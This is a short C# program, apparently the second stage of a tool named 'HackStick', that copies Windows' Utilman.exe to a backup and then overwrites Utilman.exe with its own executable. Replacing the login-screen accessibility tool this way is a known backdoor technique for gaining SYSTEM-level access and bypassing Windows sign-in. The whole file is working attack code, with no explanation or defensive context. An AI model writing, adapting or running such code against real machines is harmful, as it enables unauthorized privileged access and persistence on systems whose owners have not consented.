using System.Diagnostics;
using System.IO;
namespace HackStick.Phase2
{
    public static class Program
    {
        public static void Main()
        {
            File.Copy("C:\\Windows\\System32\\Utilman.exe", "C:\\Windows\\System32\\UtilmanBackup.exe", false);
            FileStream thisFile = File.Open(Process.GetCurrentProcess().MainModule.FileName, FileMode.Open, FileAccess.Read, FileShare.None);
            FileStream utilmanFile = File.Open("C:\\Windows\\System32\\Utilman.exe", FileMode.Open, FileAccess.Write, FileShare.None);
            thisFile.CopyTo(utilmanFile);
            thisFile.Dispose();
            utilmanFile.Dispose();
        }
    }
}